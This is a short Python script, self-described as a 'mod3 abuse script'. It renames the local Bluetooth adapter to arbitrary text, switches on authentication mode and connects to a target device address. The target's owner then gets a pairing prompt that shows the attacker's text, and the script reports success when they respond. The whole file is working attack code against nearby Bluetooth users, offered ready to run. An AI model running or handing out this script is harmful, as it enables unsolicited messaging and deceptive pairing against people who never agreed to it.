#!/usr/bin/python
# mod3 abuse script ^_^

import sys, subprocess

if len(sys.argv)!=4:
	print "\tusage: mod3abuse.py <hciN> <text_without_spaces> <bdaddr>"
	sys.exit()

hci_dev = sys.argv[1]
text = sys.argv[2]
rem_dev = sys.argv[3]
orig_auth = False

# get original local name and mode
cmd = "hciconfig -a %s" % (hci_dev)
cmd_out = subprocess.Popen(cmd.split(),stdout=subprocess.PIPE).communicate()
if cmd_out[0]:
	a = cmd_out[0].split('\n\t')
	for b in a:
		if "Name" in b: orig_name = b.split(':')[1].strip().replace('\'','')
		if "AUTH" in b: orig_auth = True

# go go go
cmd = "hciconfig -a %s name %s" % (hci_dev, text)

cmd_out = subprocess.Popen(cmd.split(),stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
if cmd_out !=('',''): 
	print "some error? change name of device failed."
	sys.exit()
else:
	if orig_auth != True: # set auth if needed
		cmd = "hciconfig -a %s auth" % (hci_dev)
		subprocess.Popen(cmd.split(),stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
print "enter PIN in your PIN-agent and wait for user's response."
cmd = "hcitool -i %s cc %s" % (hci_dev, rem_dev)
cmd_out = subprocess.Popen(cmd.split(),stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
if cmd_out[1]:
	print "no luck."
else:
	print "wh00p! ^_^"

	

# rollback
n = raw_input("> restore local device settings (name and auth mode)? y/n: ")
if n=='y':
	print 'restoring local device settings..',
	cmd = "hciconfig -a %s name %s" % (hci_dev, orig_name)
	subprocess.Popen(cmd.split(),stdout=subprocess.PIPE).communicate()
	if orig_auth == False:
		cmd = "hciconfig -a %s noauth" % (hci_dev)
		subprocess.Popen(cmd.split(),stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
	print 'done.'
